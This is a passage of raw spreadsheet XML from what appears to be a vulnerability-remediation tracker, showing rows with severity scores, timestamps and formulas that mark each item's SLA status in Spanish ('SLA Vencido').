      <c r="O56" s="6"/>
      <c r="P56" s="10"/>
      <c r="Q56" s="6" t="s">
        <v>2154</v>
      </c>
      <c r="R56" s="22"/>
      <c r="S56" s="22"/>
      <c r="T56" s="8">
        <v>45201.635740740741</v>
      </c>
      <c r="U56" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1007.3642592592587</v>
      </c>
      <c r="V56" s="8">
        <f t="shared" si="1"/>
        <v>45321.635740740741</v>
      </c>
      <c r="W56" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X56" s="11"/>
      <c r="Y56" s="11"/>
      <c r="Z56" s="11"/>
      <c r="AA56" s="8"/>
      <c r="AB56" s="9" t="s">
        <v>2310</v>
      </c>
      <c r="AC56" s="32" t="s">
        <v>2311</v>
      </c>
      <c r="AD56" s="32" t="s">
        <v>2312</v>
      </c>
      <c r="AE56" s="29" t="s">
        <v>2192</v>
      </c>
      <c r="AF56" s="9" t="s">
        <v>2284</v>
      </c>
      <c r="AG56" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="57" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A57" s="5">
        <v>56</v>
      </c>
      <c r="B57" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C57" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D57" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E57" s="4"/>
      <c r="F57" s="4"/>
      <c r="G57" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H57" s="4" t="s">
        <v>2313</v>
      </c>
      <c r="I57" s="6" t="s">
        <v>2314</v>
      </c>
      <c r="J57" s="4" t="s">
        <v>75</v>
      </c>
      <c r="K57" s="4"/>
      <c r="L57" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M57" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N57" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O57" s="6"/>
      <c r="P57" s="6"/>
      <c r="Q57" s="6" t="s">
        <v>2154</v>
      </c>
      <c r="R57" s="22"/>
      <c r="S57" s="22"/>
      <c r="T57" s="8">
        <v>45201.636701388888</v>
      </c>
      <c r="U57" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1007.3632986111115</v>
      </c>
      <c r="V57" s="8">
        <f t="shared" si="1"/>
        <v>45321.636701388888</v>
      </c>
      <c r="W57" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X57" s="11"/>
      <c r="Y57" s="11"/>
      <c r="Z57" s="11"/>
      <c r="AA57" s="8"/>
      <c r="AB57" s="9" t="s">
        <v>2315</v>
      </c>
      <c r="AC57" s="32" t="s">
        <v>1240</v>
      </c>
      <c r="AD57" s="32" t="s">
        <v>1241</v>
      </c>
      <c r="AE57" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF57" s="9"/>
      <c r="AG57" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="58" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A58" s="5">
        <v>57</v>
      </c>
      <c r="B58" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C58" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D58" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E58" s="4"/>
      <c r="F58" s="4"/>
      <c r="G58" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H58" s="4" t="s">
        <v>2316</v>
      </c>
      <c r="I58" s="6" t="s">
        <v>2317</v>
      </c>
      <c r="J58" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K58" s="4"/>
      <c r="L58" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M58" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N58" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O58" s="6"/>
      <c r="P58" s="6"/>
      <c r="Q58" s="6" t="s">
        <v>2154</v>
      </c>
      <c r="R58" s="22"/>
      <c r="S58" s="22"/>
      <c r="T58" s="8">
        <v>45201.637719907405</v>
      </c>
      <c r="U58" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1007.362280092595</v>
      </c>
      <c r="V58" s="8">
        <f t="shared" si="1"/>
        <v>45321.637719907405</v>
      </c>
      <c r="W58" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X58" s="11"/>
      <c r="Y58" s="11"/>
      <c r="Z58" s="11"/>
      <c r="AA58" s="8"/>
      <c r="AB58" s="9" t="s">
        <v>1226</v>
      </c>
      <c r="AC58" s="32" t="s">
        <v>2318</v>
      </c>
      <c r="AD58" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE58" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF58" s="9"/>
      <c r="AG58" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="59" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A59" s="5">
        <v>58</v>
      </c>
      <c r="B59" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C59" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D59" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E59" s="4"/>
      <c r="F59" s="4"/>
      <c r="G59" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H59" s="4" t="s">
        <v>2319</v>
      </c>
      <c r="I59" s="6" t="s">
        <v>2320</v>
      </c>
      <c r="J59" s="4" t="s">
        <v>1764</v>
      </c>
      <c r="K59" s="4"/>
      <c r="L59" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M59" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N59" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O59" s="6"/>
      <c r="P59" s="10"/>
      <c r="Q59" s="4" t="s">
        <v>2321</v>
      </c>
      <c r="R59" s="22"/>
      <c r="S59" s="22"/>
      <c r="T59" s="8">
        <v>45223.627430555556</v>
      </c>
      <c r="U59" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>985.3725694444438</v>
      </c>
      <c r="V59" s="8">
        <f t="shared" si="1"/>
        <v>45343.627430555556</v>
      </c>
      <c r="W59" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X59" s="11"/>
      <c r="Y59" s="11"/>
      <c r="Z59" s="11"/>
      <c r="AA59" s="8">
        <v>45631</v>
      </c>
      <c r="AB59" s="9" t="s">
        <v>2264</v>
      </c>
      <c r="AC59" s="32" t="s">
        <v>2322</v>
      </c>
      <c r="AD59" s="32" t="s">
        <v>2323</v>
      </c>
      <c r="AE59" s="4"/>
      <c r="AF59" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG59" s="27" t="s">
        <v>2052</v>
      </c>
    </row>
    <row r="60" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A60" s="5">
        <v>59</v>
      </c>
      <c r="B60" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C60" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D60" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E60" s="4"/>
      <c r="F60" s="4"/>
      <c r="G60" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H60" s="4" t="s">
        <v>2324</v>
      </c>
      <c r="I60" s="6" t="s">
        <v>2325</v>
      </c>
      <c r="J60" s="4" t="s">
        <v>1469</v>
      </c>
      <c r="K60" s="4"/>
      <c r="L60" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M60" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N60" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O60" s="6"/>
      <c r="P60" s="10"/>
      <c r="Q60" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R60" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S60" s="22"/>
      <c r="T60" s="8">
        <v>45439.477800925924</v>
      </c>
      <c r="U60" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>769.52219907407562</v>
      </c>
      <c r="V60" s="8">
        <f t="shared" si="1"/>
        <v>45559.477800925924</v>
      </c>
      <c r="W60" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X60" s="11"/>
      <c r="Y60" s="11"/>
      <c r="Z60" s="11"/>
      <c r="AA60" s="8"/>
      <c r="AB60" s="9" t="s">
        <v>2326</v>
      </c>
      <c r="AC60" s="32" t="s">
        <v>2327</v>
      </c>
      <c r="AD60" s="32" t="s">
        <v>2328</v>
      </c>
      <c r="AE60" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF60" s="9"/>
      <c r="AG60" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="61" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A61" s="5">
        <v>60</v>
      </c>
      <c r="B61" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C61" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D61" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E61" s="4"/>
      <c r="F61" s="4"/>
      <c r="G61" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H61" s="4" t="s">
        <v>2329</v>
      </c>
      <c r="I61" s="6" t="s">
        <v>2330</v>
      </c>
      <c r="J61" s="4" t="s">
        <v>1115</v>
      </c>
      <c r="K61" s="4"/>
      <c r="L61" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M61" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N61" s="42">
        <v>3</v>
      </c>
      <c r="O61" s="6"/>
      <c r="P61" s="10"/>
      <c r="Q61" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R61" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S61" s="22"/>
      <c r="T61" s="8">
        <v>45439.479722222219</v>
      </c>
      <c r="U61" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>769.5202777777813</v>
      </c>
      <c r="V61" s="8">
        <f t="shared" si="1"/>
        <v>45559.479722222219</v>
      </c>
      <c r="W61" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X61" s="11"/>
      <c r="Y61" s="11"/>
      <c r="Z61" s="11"/>
      <c r="AA61" s="8"/>
      <c r="AB61" s="9" t="s">
        <v>2331</v>
      </c>
      <c r="AC61" s="32" t="s">
        <v>1117</v>
      </c>
      <c r="AD61" s="32" t="s">
        <v>2332</v>
      </c>
      <c r="AE61" s="27" t="s">
        <v>2192</v>
      </c>
      <c r="AF61" s="9" t="s">
        <v>2284</v>
      </c>
      <c r="AG61" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="62" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A62" s="5">
        <v>61</v>
      </c>
      <c r="B62" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C62" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D62" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E62" s="4"/>
      <c r="F62" s="4"/>
      <c r="G62" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H62" s="4" t="s">
        <v>2333</v>
      </c>
      <c r="I62" s="6" t="s">
        <v>2334</v>
      </c>
      <c r="J62" s="4" t="s">
        <v>1186</v>
      </c>
      <c r="K62" s="4"/>
      <c r="L62" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M62" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N62" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O62" s="6"/>
      <c r="P62" s="6"/>
      <c r="Q62" s="6" t="s">
        <v>2113</v>
      </c>
      <c r="R62" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S62" s="22"/>
      <c r="T62" s="8">
        <v>45447.684490740743</v>
      </c>
      <c r="U62" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>761.31550925925694</v>
      </c>
      <c r="V62" s="8">
        <f t="shared" si="1"/>
        <v>45567.684490740743</v>
      </c>
      <c r="W62" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X62" s="11"/>
      <c r="Y62" s="11"/>
      <c r="Z62" s="11"/>
      <c r="AA62" s="8">
        <v>45631</v>
      </c>
      <c r="AB62" s="9" t="s">
        <v>2335</v>
      </c>
      <c r="AC62" s="32" t="s">
        <v>2336</v>
      </c>
      <c r="AD62" s="32" t="s">
        <v>1189</v>
      </c>
      <c r="AE62" s="4"/>
      <c r="AF62" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG62" s="27" t="s">
        <v>2052</v>
      </c>
    </row>
    <row r="63" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A63" s="5">
        <v>62</v>
      </c>
      <c r="B63" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C63" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D63" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E63" s="4"/>
      <c r="F63" s="4"/>
      <c r="G63" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H63" s="4" t="s">
        <v>2337</v>
      </c>
      <c r="I63" s="6" t="s">
        <v>2338</v>
      </c>
      <c r="J63" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K63" s="4"/>
      <c r="L63" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M63" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N63" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O63" s="6"/>
      <c r="P63" s="6"/>
      <c r="Q63" s="6" t="s">
        <v>2113</v>
      </c>
      <c r="R63" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S63" s="22"/>
      <c r="T63" s="8">
        <v>45447.685532407406</v>
      </c>
      <c r="U63" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>761.31446759259416</v>
      </c>
      <c r="V63" s="8">
        <f t="shared" si="1"/>
        <v>45567.685532407406</v>
      </c>
      <c r="W63" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X63" s="11"/>
      <c r="Y63" s="11"/>
      <c r="Z63" s="11"/>
      <c r="AA63" s="8"/>
      <c r="AB63" s="9" t="s">
        <v>1226</v>
      </c>
      <c r="AC63" s="32" t="s">
        <v>2339</v>
      </c>
      <c r="AD63" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE63" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF63" s="27"/>
      <c r="AG63" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="64" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A64" s="5">
        <v>63</v>
      </c>
      <c r="B64" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C64" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D64" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E64" s="4"/>
      <c r="F64" s="4"/>
      <c r="G64" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H64" s="4" t="s">
        <v>2340</v>
      </c>
      <c r="I64" s="6" t="s">
        <v>2341</v>
      </c>
      <c r="J64" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K64" s="4"/>
      <c r="L64" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M64" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N64" s="42">
        <v>2.7999999523162842</v>
      </c>
      <c r="O64" s="6"/>
      <c r="P64" s="6"/>
      <c r="Q64" s="6" t="s">
        <v>2107</v>
      </c>
      <c r="R64" s="22"/>
      <c r="S64" s="22"/>
      <c r="T64" s="8">
        <v>45449.864710648151</v>
      </c>
      <c r="U64" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>759.13528935184877</v>
      </c>
      <c r="V64" s="8">
        <f t="shared" si="1"/>
        <v>45569.864710648151</v>
      </c>
      <c r="W64" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X64" s="11"/>
      <c r="Y64" s="11"/>
      <c r="Z64" s="11"/>
      <c r="AA64" s="8"/>
      <c r="AB64" s="9" t="s">
        <v>1226</v>
      </c>
      <c r="AC64" s="32" t="s">
        <v>2342</v>
      </c>
      <c r="AD64" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE64" s="4"/>
      <c r="AF64" s="9"/>
      <c r="AG64" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="65" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A65" s="5">
        <v>64</v>
      </c>
      <c r="B65" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C65" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D65" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E65" s="4"/>
      <c r="F65" s="4"/>
      <c r="G65" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H65" s="4" t="s">
        <v>2343</v>
      </c>
      <c r="I65" s="6" t="s">
        <v>2344</v>
      </c>
      <c r="J65" s="4" t="s">
        <v>2345</v>
      </c>
      <c r="K65" s="4"/>
      <c r="L65" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M65" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N65" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O65" s="6"/>
      <c r="P65" s="10"/>
      <c r="Q65" s="6" t="s">
        <v>2243</v>
      </c>
      <c r="R65" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S65" s="22"/>
      <c r="T65" s="8">
        <v>45463.417870370373</v>
      </c>
      <c r="U65" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>745.58212962962716</v>
      </c>
      <c r="V65" s="8">
        <f t="shared" si="1"/>
        <v>45583.417870370373</v>
      </c>
      <c r="W65" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X65" s="11"/>
      <c r="Y65" s="11"/>
      <c r="Z65" s="11"/>
      <c r="AA65" s="8"/>
      <c r="AB65" s="9" t="s">
        <v>2346</v>
      </c>
      <c r="AC65" s="32" t="s">
        <v>2347</v>
      </c>
      <c r="AD65" s="32" t="s">
        <v>2348</v>
      </c>
      <c r="AE65" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF65" s="9"/>
      <c r="AG65" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="66" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A66" s="5">
        <v>65</v>
      </c>
      <c r="B66" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C66" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D66" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E66" s="4"/>
      <c r="F66" s="4"/>
      <c r="G66" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H66" s="4" t="s">
        <v>2349</v>
      </c>
      <c r="I66" s="6" t="s">
        <v>2350</v>
      </c>
      <c r="J66" s="4" t="s">
        <v>75</v>
      </c>
      <c r="K66" s="4"/>
      <c r="L66" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M66" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N66" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O66" s="6"/>
      <c r="P66" s="6"/>
      <c r="Q66" s="6" t="s">
        <v>2243</v>
      </c>
      <c r="R66" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S66" s="22"/>
      <c r="T66" s="8">
        <v>45463.41909722222</v>
      </c>
      <c r="U66" s="11">
        <f t="shared" ref="U66:U129" ca="1" si="3">TODAY()-T66</f>
        <v>745.58090277777956</v>
      </c>
      <c r="V66" s="8">
        <f t="shared" ref="V66:V129" si="4">IF(M66="Critical",T66+10,IF(M66="High",T66+30,IF(M66="Bad",T66+30,IF(M66="Medium",T66+90,IF(M66="Warm",T66+90,IF(M66="Low",T66+120,IF(M66="Fair",T66+120,IF(M66="Neutral",T66+120,""))))))))</f>
        <v>45583.41909722222</v>
      </c>
      <c r="W66" s="12" t="str">
        <f t="shared" ref="W66:W129" ca="1" si="5">IF(M66="Critical",IF(U66&gt;10,"SLA Vencido","En SLA"),IF(M66="High",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Bad",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Medium",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Warm",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Low",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Fair",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Neutral",IF(U66&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X66" s="11"/>
      <c r="Y66" s="11"/>
      <c r="Z66" s="11"/>
      <c r="AA66" s="8"/>
      <c r="AB66" s="9" t="s">
        <v>2257</v>
      </c>
      <c r="AC66" s="32" t="s">
        <v>1240</v>
      </c>
      <c r="AD66" s="32" t="s">
        <v>1241</v>
      </c>
      <c r="AE66" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF66" s="9"/>
      <c r="AG66" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="67" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A67" s="5">
        <v>66</v>
      </c>
      <c r="B67" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C67" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D67" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E67" s="4"/>
      <c r="F67" s="4"/>
      <c r="G67" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H67" s="4" t="s">
        <v>2351</v>
      </c>
      <c r="I67" s="6" t="s">
        <v>2352</v>
      </c>
      <c r="J67" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K67" s="4"/>
      <c r="L67" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M67" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N67" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O67" s="6" t="s">
        <v>112</v>
      </c>
      <c r="P67" s="10"/>
      <c r="Q67" s="6" t="s">
        <v>2243</v>
      </c>
      <c r="R67" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S67" s="22"/>
      <c r="T67" s="8">
        <v>45463.420370370368</v>
      </c>
      <c r="U67" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>745.57962962963211</v>
      </c>
      <c r="V67" s="8">
        <f t="shared" si="4"/>
        <v>45583.420370370368</v>
      </c>
      <c r="W67" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X67" s="11"/>
      <c r="Y67" s="11"/>
      <c r="Z67" s="11"/>
      <c r="AA67" s="8"/>
      <c r="AB67" s="9" t="s">
        <v>1226</v>
      </c>
      <c r="AC67" s="32" t="s">
        <v>2353</v>
      </c>
      <c r="AD67" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE67" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF67" s="9"/>
      <c r="AG67" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="68" spans="1:33" ht="99" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A68" s="5">
        <v>67</v>
      </c>
      <c r="B68" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C68" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D68" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E68" s="4"/>
      <c r="F68" s="4"/>
      <c r="G68" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H68" s="4" t="s">
        <v>2354</v>
      </c>
      <c r="I68" s="6" t="s">
        <v>2355</v>
      </c>
      <c r="J68" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K68" s="4"/>
      <c r="L68" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M68" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N68" s="42">
        <v>3.2000000476837158</v>
      </c>
      <c r="O68" s="6"/>
      <c r="P68" s="6"/>
      <c r="Q68" s="6" t="s">
        <v>2099</v>
      </c>
      <c r="R68" s="22" t="s">
        <v>2263</v>
      </c>
      <c r="S68" s="22"/>
      <c r="T68" s="8">
        <v>45483.269085648149</v>
      </c>
      <c r="U68" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>725.73091435185052</v>
      </c>
      <c r="V68" s="8">
        <f t="shared" si="4"/>
        <v>45603.269085648149</v>
      </c>
      <c r="W68" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X68" s="11"/>
      <c r="Y68" s="11"/>
      <c r="Z68" s="11"/>
      <c r="AA68" s="8"/>
      <c r="AB68" s="9" t="s">
        <v>2356</v>
      </c>
      <c r="AC68" s="32" t="s">
        <v>2357</v>
      </c>
      <c r="AD68" s="32" t="s">
        <v>2358</v>
      </c>
      <c r="AE68" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF68" s="9"/>
      <c r="AG68" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="69" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A69" s="5">
        <v>68</v>
      </c>
      <c r="B69" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C69" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D69" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E69" s="4"/>
      <c r="F69" s="4"/>
      <c r="G69" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H69" s="4" t="s">
        <v>2359</v>
      </c>
      <c r="I69" s="6" t="s">
        <v>2360</v>
      </c>
      <c r="J69" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K69" s="4"/>
      <c r="L69" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M69" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N69" s="42">
        <v>3.5999999046325684</v>
      </c>
      <c r="O69" s="6"/>
      <c r="P69" s="6"/>
      <c r="Q69" s="6" t="s">
        <v>2099</v>
      </c>
      <c r="R69" s="22" t="s">
        <v>2263</v>
      </c>
      <c r="S69" s="22"/>
      <c r="T69" s="8">
        <v>45483.267384259256</v>
      </c>
      <c r="U69" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>725.73261574074422</v>
      </c>
      <c r="V69" s="8">
        <f t="shared" si="4"/>
        <v>45603.267384259256</v>
      </c>
      <c r="W69" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X69" s="11"/>
      <c r="Y69" s="11"/>
      <c r="Z69" s="11"/>
      <c r="AA69" s="8"/>
      <c r="AB69" s="9" t="s">
        <v>2361</v>
      </c>
      <c r="AC69" s="32" t="s">
        <v>1183</v>
      </c>
      <c r="AD69" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE69" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF69" s="9"/>
      <c r="AG69" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="70" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A70" s="5">
        <v>69</v>
      </c>
      <c r="B70" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C70" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D70" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E70" s="4"/>
      <c r="F70" s="4"/>
      <c r="G70" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H70" s="4" t="s">
        <v>2362</v>
      </c>
      <c r="I70" s="6" t="s">
        <v>2363</v>
      </c>
      <c r="J70" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K70" s="4"/>
      <c r="L70" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M70" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N70" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O70" s="6"/>
      <c r="P70" s="6"/>
      <c r="Q70" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R70" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S70" s="22"/>
      <c r="T70" s="8">
        <v>44805.41333333333</v>
      </c>
      <c r="U70" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1403.5866666666698</v>
      </c>
      <c r="V70" s="8">
        <f t="shared" si="4"/>
        <v>44925.41333333333</v>
      </c>
      <c r="W70" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X70" s="11"/>
      <c r="Y70" s="11"/>
      <c r="Z70" s="11"/>
      <c r="AA70" s="8"/>
      <c r="AB70" s="9" t="s">
        <v>2364</v>
      </c>
      <c r="AC70" s="32" t="s">
        <v>2365</v>
      </c>
      <c r="AD70" s="32" t="s">
        <v>905</v>
      </c>
      <c r="AE70" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF70" s="9"/>
      <c r="AG70" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="71" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A71" s="5">
        <v>70</v>
      </c>
      <c r="B71" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C71" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D71" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E71" s="4"/>
      <c r="F71" s="4"/>
      <c r="G71" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H71" s="4" t="s">
        <v>2366</v>
      </c>
      <c r="I71" s="6" t="s">
        <v>2367</v>
      </c>
      <c r="J71" s="4" t="s">
        <v>2368</v>
      </c>
      <c r="K71" s="4"/>
      <c r="L71" s="5" t="s">
        <v>655</v>
      </c>
